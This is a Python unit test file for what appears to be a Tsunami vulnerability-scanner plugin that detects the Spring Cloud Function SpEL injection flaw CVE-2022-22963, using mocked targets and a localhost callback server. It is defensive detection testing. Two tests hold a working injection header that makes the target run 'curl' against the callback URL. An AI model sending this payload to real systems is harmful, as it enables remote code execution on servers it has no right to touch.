# Copyright 2022 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
"""Tests for SpringCloudFunctionDetector."""

import unittest.mock as umock
from absl.testing import absltest
import requests_mock

import tsunami_plugin
from common.data import network_endpoint_utils
from common.net.http.requests_http_client import RequestsHttpClientBuilder
from plugin.payload.payload_generator import PayloadGenerator
from plugin.payload.payload_secret_generator import PayloadSecretGenerator
from plugin.payload.payload_utility import get_parsed_payload
from plugin.tcs_client import TcsClient
import detection_pb2
import network_pb2
import network_service_pb2
import plugin_representation_pb2
import reconnaissance_pb2
import software_pb2
import vulnerability_pb2
from third_party.tsunami_plugins.py_plugins.spring_cloud_function_cve_202222963 import spring_cloud_function_detector
from third_party.tsunami_plugins.py_plugins.spring_cloud_function_cve_202222963.spring_cloud_function_detector import _VULN_DESCRIPTION
from third_party.tsunami_plugins.py_plugins.spring_cloud_function_cve_202222963.spring_cloud_function_detector import _VULN_PATH


# Callback server
_CBID = '04041e8898e739ca33a250923e24f59ca41a8373f8cf6a45a1275f3b'
_IP_ADDRESS = '127.0.0.1'
_PORT = 8000
_SECRET = 'a3d9ed89deadbeef'
_CALLBACK_URL = 'http://%s:%s/%s' % (_IP_ADDRESS, _PORT, _CBID)

# Vulnerable target
_TARGET_URL = 'vuln-target.com'
_TARGET_PORT = 9001


class SpringCloudFunctionDetectorTest(absltest.TestCase):
  def setUp(self):
    super().setUp()
    # payload generator and client with callback
    request_client = RequestsHttpClientBuilder().build()
    self.psg = PayloadSecretGenerator()
    self.psg.generate = umock.MagicMock(return_value=_SECRET)
    callback_client = TcsClient(
        _IP_ADDRESS, _PORT, _CALLBACK_URL, request_client
    )
    self.payloads = get_parsed_payload()
    self.payload_generator = PayloadGenerator(
        self.psg, self.payloads, callback_client
    )
    # detector
    self.detector = spring_cloud_function_detector.Cve202222963Detector(
        request_client, self.payload_generator
    )

  @requests_mock.mock()
  def test_detect_vuln_target_with_callback_server_returns_vul(self, mock):
    # response for vulnerable target
    body = '1234'
    mock.register_uri(
        'POST',
        'http://%s:%s/%s' % (_TARGET_URL, _TARGET_PORT, _VULN_PATH),
        content=body.encode('utf-8'),
        status_code=500,
        request_headers={
            'spring.cloud.function.routing-expression': (
                'T(java.lang.Runtime).getRuntime().exec("curl %s")'
                % _CALLBACK_URL
            )
        },
    )
    # response for callback server
    body = '{ "has_dns_interaction":false, "has_http_interaction":true}'
    mock.register_uri(
        'GET',
        '%s/?secret=%s' % (_CALLBACK_URL, _SECRET),
        content=body.encode('utf-8'),
    )
    network_service = network_service_pb2.NetworkService(
        network_endpoint=network_endpoint_utils.for_hostname_and_port(
            _TARGET_URL, _TARGET_PORT
        ),
        transport_protocol=network_pb2.TransportProtocol.TCP,
        software=software_pb2.Software(name='http'),
        service_name='http',
    )
    target_info = reconnaissance_pb2.TargetInfo(
        network_endpoints=[network_service.network_endpoint]
    )
    detection_reports = self.detector.Detect(target_info, [network_service])
    self.assertEqual(
        detection_pb2.DetectionReport(
            target_info=target_info,
            network_service=network_service,
            detection_status=detection_pb2.VULNERABILITY_VERIFIED,
            vulnerability=vulnerability_pb2.Vulnerability(
                main_id=vulnerability_pb2.VulnerabilityId(
                    publisher='TSUNAMI_COMMUNITY', value='CVE_2022_22963'
                ),
                severity=vulnerability_pb2.CRITICAL,
                title=(
                    'Spring Cloud Function SpEL Code Injection RCE'
                    ' (CVE-2022-22963)'
                ),
                recommendation=(
                    'Users of affected versions should upgrade to 3.1.7, 3.2.3.'
                ),
                description=_VULN_DESCRIPTION,
            ),
        ),
        detection_reports.detection_reports[0],
    )

  @requests_mock.mock()
  def test_detect_unknown_service_with_callback_server_returns_vul(self, mock):
    # response for vulnerable target
    body = '1234'
    mock.register_uri(
        'POST',
        'http://%s:%s/%s' % (_TARGET_URL, _TARGET_PORT, _VULN_PATH),
        content=body.encode('utf-8'),
        status_code=500,
        request_headers={
            'spring.cloud.function.routing-expression': (
                'T(java.lang.Runtime).getRuntime().exec("curl %s")'
                % _CALLBACK_URL
            )
        },
    )
    # response for callback server
    body = '{ "has_dns_interaction":false, "has_http_interaction":true}'
    mock.register_uri(
        'GET',
        '%s/?secret=%s' % (_CALLBACK_URL, _SECRET),
        content=body.encode('utf-8'),
    )
    network_service = network_service_pb2.NetworkService(
        network_endpoint=network_endpoint_utils.for_hostname_and_port(
            _TARGET_URL, _TARGET_PORT
        ),
        transport_protocol=network_pb2.TransportProtocol.TCP,
        software=software_pb2.Software(name='http'),
    )
    target_info = reconnaissance_pb2.TargetInfo(
        network_endpoints=[network_service.network_endpoint]
    )
    detection_reports = self.detector.Detect(target_info, [network_service])
    self.assertEqual(
        detection_pb2.DetectionReport(
            target_info=target_info,
            network_service=network_service,
            detection_status=detection_pb2.VULNERABILITY_VERIFIED,
            vulnerability=vulnerability_pb2.Vulnerability(
                main_id=vulnerability_pb2.VulnerabilityId(
                    publisher='TSUNAMI_COMMUNITY', value='CVE_2022_22963'
                ),
                severity=vulnerability_pb2.CRITICAL,
                title=(
                    'Spring Cloud Function SpEL Code Injection RCE'
                    ' (CVE-2022-22963)'
                ),
                recommendation=(
                    'Users of affected versions should upgrade to 3.1.7, 3.2.3.'
                ),
                description=_VULN_DESCRIPTION,
            ),
        ),
        detection_reports.detection_reports[0],
    )

  @requests_mock.mock()
  def test_detect_healthy_target_with_callback_server_returns_empty(self, mock):
    # response for vulnerable target
    body = '1234'
    mock.register_uri(
        'POST',
        'http://%s:%s/%s' % (_TARGET_URL, _TARGET_PORT, _VULN_PATH),
        content=body.encode('utf-8'),
        status_code=200,
    )
    # response for callback server
    mock.register_uri(
        'GET', '%s/?secret=%s' % (_CALLBACK_URL, _SECRET), status_code=404
    )
    network_service = network_service_pb2.NetworkService(
        network_endpoint=network_endpoint_utils.for_hostname_and_port(
            _TARGET_URL, _TARGET_PORT
        ),
        transport_protocol=network_pb2.TransportProtocol.TCP,
        software=software_pb2.Software(name='http'),
        service_name='http',
    )
    target_info = reconnaissance_pb2.TargetInfo(
        network_endpoints=[network_service.network_endpoint]
    )
    detection_reports = self.detector.Detect(target_info, [network_service])
    self.assertEmpty(detection_reports.detection_reports)

  @requests_mock.mock()
  def test_detect_vuln_target_with_callback_server_returns_empty(self, mock):
    # detector without callback
    disabled_client = TcsClient('', 0, '', RequestsHttpClientBuilder().build())
    self.detector.payload_generator = PayloadGenerator(
        self.psg, self.payloads, disabled_client
    )
    # response for vulnerable target
    body = '1234'
    mock.register_uri(
        'POST',
        'http://%s:%s/%s' % (_TARGET_URL, _TARGET_PORT, _VULN_PATH),
        content=body.encode('utf-8'),
        status_code=200,
    )
    # response for callback server
    mock.register_uri(
        'GET', '%s/?secret=%s' % (_CALLBACK_URL, _SECRET), status_code=404
    )
    network_service = network_service_pb2.NetworkService(
        network_endpoint=network_endpoint_utils.for_hostname_and_port(
            _TARGET_URL, _TARGET_PORT
        ),
        transport_protocol=network_pb2.TransportProtocol.TCP,
        software=software_pb2.Software(name='http'),
        service_name='http',
    )
    target_info = reconnaissance_pb2.TargetInfo(
        network_endpoints=[network_service.network_endpoint]
    )
    detection_reports = self.detector.Detect(target_info, [network_service])
    self.assertEmpty(detection_reports.detection_reports)

  def test_get_plugin_definition_returns_plugin_definition(self):
    self.assertEqual(
        tsunami_plugin.PluginDefinition(
            info=plugin_representation_pb2.PluginInfo(
                type=plugin_representation_pb2.PluginInfo.VULN_DETECTION,
                name='Cve202222963VulnDetector',
                version='1.0',
                description=_VULN_DESCRIPTION,
                author='threedr3am (qiaoer1320@gmail.com)',
            )
        ),
        self.detector.GetPluginDefinition(),
    )


if __name__ == '__main__':
  absltest.main()
